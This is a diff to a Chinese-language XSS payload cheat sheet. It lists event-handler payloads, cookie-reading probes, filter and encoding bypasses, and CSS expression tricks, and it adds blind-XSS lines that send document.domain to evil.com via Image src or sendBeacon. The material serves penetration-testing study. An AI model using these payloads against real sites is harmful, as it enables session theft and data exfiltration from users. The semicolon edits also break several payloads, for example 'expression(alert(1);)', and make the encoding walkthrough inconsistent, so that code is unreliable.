@@ -21,10 +21,10 @@ Host: example.com
 <input value="test" type="text">
 ```
 
-若搜索的内容是一段 Payload, 如： `"onclick=alert(1)"` 那么就会在浏览器注入 XSS
+若搜索的内容是一段 Payload, 如： `"onclick=alert(1);"` 那么就会在浏览器注入 XSS
 
 ```
-<input value=""onclick=alert(1)"" type="text">
+<input value=""onclick=alert(1);"" type="text">
 ```
 
 ### 1.1. 存在位置
@@ -50,12 +50,12 @@ Host: example.com
 
 ### 1.2. 常用执行函数
 
-| 弹窗验证                 | 控制台验证                     |
-| ------------------------ | ------------------------------ |
-| alert(document.cookie)   | console.log(document.cookie)   |
-| confirm(document.cookie) | console.info(document.cookie)  |
-| prompt(document.cookie)  | console.error(document.cookie) |
-|                          | console.warn(document.cookie)  |
+| 弹窗验证                  | 控制台验证                      |
+| ------------------------- | ------------------------------- |
+| alert(document.cookie);   | console.log(document.cookie);   |
+| confirm(document.cookie); | console.info(document.cookie);  |
+| prompt(document.cookie);  | console.error(document.cookie); |
+|                           | console.warn(document.cookie);  |
 
 若无法弹窗验证或者控制台验证可以尝试组合 CSRF 使用
 
@@ -68,42 +68,42 @@ Host: example.com
 加载事件
 
 ```
-onload=alert(1)	         # 元素加载完成时触发
-onerror=alert(1)         # 元素加载失败时触发
+onload=alert(1);	         # 元素加载完成时触发
+onerror=alert(1);         # 元素加载失败时触发
 ```
 
 鼠标事件
 
 ```
-onclick=alert(1)	     # 点击元素时触发
-ondblclick=alert(1)      # 双击元素时触发
-oncontextmenu=alert(1)   # 右击元素时触发
-onmousemove=alert(1)	 # 鼠标移动到元素上方时触发
-onmouseover=alert(1)	 # 鼠标悬停在元素上方时触发
-onmousedown=alert(1)	 # 鼠标按下时触发
-onmouseup=alert(1)	     # 鼠标松开时触发
-onmouseenter=alert(1)    # 鼠标进入元素时触发
-onmouseleave=alert(1)    # 鼠标离开元素时触发
+onclick=alert(1);	     # 点击元素时触发
+ondblclick=alert(1);      # 双击元素时触发
+oncontextmenu=alert(1);   # 右击元素时触发
+onmousemove=alert(1);	 # 鼠标移动到元素上方时触发
+onmouseover=alert(1);	 # 鼠标悬停在元素上方时触发
+onmousedown=alert(1);	 # 鼠标按下时触发
+onmouseup=alert(1);	     # 鼠标松开时触发
+onmouseenter=alert(1);    # 鼠标进入元素时触发
+onmouseleave=alert(1);    # 鼠标离开元素时触发
 ```
 
 表单事件
 
 ```
-onfocus=alert(1)        # 元素获得焦点
-onblur=alert(1)         # 元素失去焦点
-oninput=alert(1)        # 用户输入时触发
-onselect=alert(1)       # 用户选中文本时触发
-onsubmit=alert(1)       # 表单提交时触发
-onreset=alert(1)        # 表单重置时触发
-onchange=alert(1)       # 输入框, 下拉框等内容变更后失焦
+onfocus=alert(1);        # 元素获得焦点
+onblur=alert(1);         # 元素失去焦点
+oninput=alert(1);        # 用户输入时触发
+onselect=alert(1);       # 用户选中文本时触发
+onsubmit=alert(1);       # 表单提交时触发
+onreset=alert(1);        # 表单重置时触发
+onchange=alert(1);       # 输入框, 下拉框等内容变更后失焦
 ```
 
 键盘事件
 
 ```
-onkeydown=alert(1)      # 按键按下
-onkeypress=alert(1)     # 按键按下并产生字符
-onkeyup=alert(1)        # 按键释放
+onkeydown=alert(1);      # 按键按下
+onkeypress=alert(1);     # 按键按下并产生字符
+onkeyup=alert(1);        # 按键释放
 ```
 
 ## 2. 数据提交类
@@ -151,7 +151,21 @@ onkeyup=alert(1)        # 按键释放
 提交这个字符串可以判断过滤了哪些字符
 
 ```
-javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+console.log(1);//'>
+```
+
+使用 OOB 测试 Blind XSS
+
+```
+<img src=x onerror="new Image().src='https://evil.com?c='+document.domain;">
+```
+
+```
+<script>new Image().src="https://evil.com?c="+document.domain;</script>
+```
+
+```
+<script>navigator.sendBeacon("https://evil.com", document.domain);</script>
 ```
 
 ## 3. 文件解析类
@@ -182,7 +196,7 @@ Content-Disposition: form-data; name="uploaded"; filename="XSS.png"
 Content-Disposition: form-data; name="uploaded"; filename="XSS.html"
 
  PNG
-<script>alert(1)</script>
+<script>alert(1);</script>
 ```
 
 从 Burp Suite 中查找关键词 XSS.html 得到路径后访问 URL 即可触发 XSS
@@ -215,31 +229,31 @@ data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
 引号闭合插入事件绕过
 
 ```
-" onclick=alert(1)
+" onclick=alert(1);
 ```
 
 尖括号闭合插入标签绕过
 
 ```
-"><img/src/onerror=alert(1)>
+"><img/src/onerror=alert(1);>
 ```
 
 `href` 伪协议绕过
 
 ```
-<a href=javascript:alert(1)>1</a>
+<a href=javascript:alert(1);>1</a>
 ```
 
 双写绕过
 
 ```
-<a href=javascjavascriptript:alert(1)>1</a>
+<a href=javascjavascriptript:alert(1);>1</a>
 ```
 
 大小写绕过
 
 ```
-<a href=jaVaScRipT:alert(1)>1</a>
+<a href=jaVaScRipT:alert(1);>1</a>
 ```
 
 URL 编码绕过
@@ -251,7 +265,7 @@ URL 编码绕过
 添加 HTML 编码后的 Tab 绕过
 
 ```
-<a href=javasc&#09;ript:alert(1)>1</a>
+<a href=javasc&#09;ript:alert(1);>1</a>
 ```
 
 ## 5. 特殊情况
@@ -281,13 +295,13 @@ URL 编码绕过
 若引入的 URL 存在 XSS 则可能对在当前网站生效
 
 ```
-<body><span class="ng-include:'https://evil.com/xss.php?payload=<img/src/onerror=alert(1)>'"></span></body>
+<body><span class="ng-include:'https://evil.com/xss.php?payload=<img/src/onerror=alert(1);>'"></span></body>
 ```
 
 默认情况下 ng-include 只能引入当前网站的 URL
 
 ```
-<body><span class="ng-include:'/xss.php?payload=<img/src/onerror=alert(1)>'"></span></body>
+<body><span class="ng-include:'/xss.php?payload=<img/src/onerror=alert(1);>'"></span></body>
 ```
 
 ## ==未归纳==
@@ -295,7 +309,7 @@ URL 编码绕过
 分隔符绕过，某些分隔符会让后面的字符串变成新的属性，例如：`<input type="text" name="p1" value="xss"> ,:;onmousemove="alert(6)"` ，生成了 `onmousemove=""` 属性
 
 ```
-xss"> ,:;onmousemove=alert(1)
+xss"> ,:;onmousemove=alert(1);
 ```
 
 atob 解 Base64 编码绕过
@@ -351,15 +365,15 @@ jsfuck
 伪协议绕过(空格可以用 / 代替)
 
 ```
-<img/src/onerror=location="javascript:alert(1)">
+<img/src/onerror=location="javascript:alert(1);">
 ```
 
 **目标执行顺序**
 
 ```
-1.浏览器解析 HTML 标签	自动解码 HTML 的值	location="javascript:alert(1)" 为 onerror 属性的值
-2.浏览器解析 location 中的 url	自动解码 URL 编码 alert(1)
-3.浏览器识别 javascript 伪协议	自动解码 js 编码 alert(1)	（括号和括号内的不能编两次）
+1.浏览器解析 HTML 标签	自动解码 HTML 的值	location="javascript:alert(1);" 为 onerror 属性的值
+2.浏览器解析 location 中的 url	自动解码 URL 编码 alert(1);
+3.浏览器识别 javascript 伪协议	自动解码 js 编码 alert(1);	（括号和括号内的不能编两次）
 
 黑客编码顺序反过来321
 
@@ -368,7 +382,7 @@ jsfuck
 解码过程:解码HTML编码→伪协议解码URL编码→JS解释器自动解码JS编码→执行
 ```
 
-1.对 alert(1) 进行 unicode 编码（有的时候也可以直接对 () 进行编码，hex 不可以）
+1.对 alert(1); 进行 unicode 编码（有的时候也可以直接对 () 进行编码，hex 不可以）
 
 ```
 \u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029
@@ -385,7 +399,7 @@ jsfuck
 <img/src/onerror=location="javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34\u0028\u0031\u0029">
 ```
 
-3.对 location="javascript:alert(1)" 的 alert(1) 进行 unicode 编码后又对 alert 进行编码后对  location="javascript:alert(1)" 这个编码的结果再进行 html 编码
+3.对 location="javascript:alert(1);" 的 alert(1); 进行 unicode 编码后又对 alert 进行编码后对  location="javascript:alert(1);" 这个编码的结果再进行 html 编码
 
 ```
 &#x6c;&#x6f;&#x63;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x3d;&#x22;&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x33;&#x31;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x33;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x33;&#x35;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x33;&#x32;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x33;&#x34;&#x5c;&#x75;&#x30;&#x30;&#x32;&#x38;&#x5c;&#x75;&#x30;&#x30;&#x33;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x32;&#x39;&#x22;
@@ -398,7 +412,7 @@ jsfuck
 字符串切割：
 
 ```
-字符串中的部分（""中的内容） "javascript:alert(1)" 可以写成	"j"+"a"+"v"+"a"+"s"+"c"+"r"+"i"+"p"+"t"+":"+"a"+"l"+"e"+"r"+"t"+"("+"1"+")"
+字符串中的部分（""中的内容） "javascript:alert(1);" 可以写成	"j"+"a"+"v"+"a"+"s"+"c"+"r"+"i"+"p"+"t"+":"+"a"+"l"+"e"+"r"+"t"+"("+"1"+")"
 ```
 
 ```
@@ -420,7 +434,7 @@ jsfuck
 svg 可以自动解析 js 标签中的 html 编码
 
 ```
-<svg><script>alert(1)</script>
+<svg><script>alert(1);</script>
 ```
 
 ```
@@ -446,13 +460,13 @@ style="background-image:url(javascript:alert(6))"
 IE 浏览器的 expression 绕过
 
 ```
-hello:expression(alert(1))
+hello:expression(alert(1);)
 ```
 
 CSS 层叠样式表注释会替换为空
 
 ```
-hello:expr/**/ession(alert(1))
+hello:expr/**/ession(alert(1);)
 ```
 
 ---
